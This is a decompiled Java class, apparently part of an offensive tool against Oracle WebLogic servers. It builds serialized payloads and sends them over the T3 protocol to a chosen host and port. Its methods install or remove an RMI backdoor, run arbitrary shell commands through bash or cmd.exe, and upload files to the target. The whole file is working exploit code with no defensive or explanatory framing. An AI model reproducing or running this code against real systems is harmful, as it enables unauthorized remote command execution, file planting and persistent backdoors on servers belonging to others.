package com.supeream.weblogic;

//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

import com.supeream.Main;
import com.supeream.serial.SerialDataGenerator;
import com.supeream.serial.Serializables;

public class WebLogicOperation {

    public static void installRmi(String host, String port) throws Exception {
        byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"install"});
        T3ProtocolOperation.send(host, port, payload);
    }

    public static void unInstallRmi(String host, String port) throws Exception {
        byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"uninstall"});
        T3ProtocolOperation.send(host, port, payload);
    }

    public static void blind(String host, String port) throws Exception {
        byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"blind", Main.cmdLine.getOptionValue("C")});
        T3ProtocolOperation.send(host, port, payload);
    }

    public static void uploadFile(String host, String port, String filePath, byte[] content) throws Exception {
        byte[] payload = SerialDataGenerator.serialUploadDatas(filePath, content);
        T3ProtocolOperation.send(host, port, payload);
    }

    public static void blindExecute(String host, String port, String cmd) throws Exception {
        String[] cmds = new String[]{cmd};
        if (Main.cmdLine.hasOption("os")) {
            if (Main.cmdLine.getOptionValue("os").equalsIgnoreCase("linux")) {
                cmds = new String[]{"/bin/bash", "-c", cmd};
            } else {
                cmds = new String[]{"cmd.exe", "/c", cmd};
            }
        }
        byte[] payload = SerialDataGenerator.serialBlindDatas(cmds);
        T3ProtocolOperation.send(host, port, payload);
    }

}
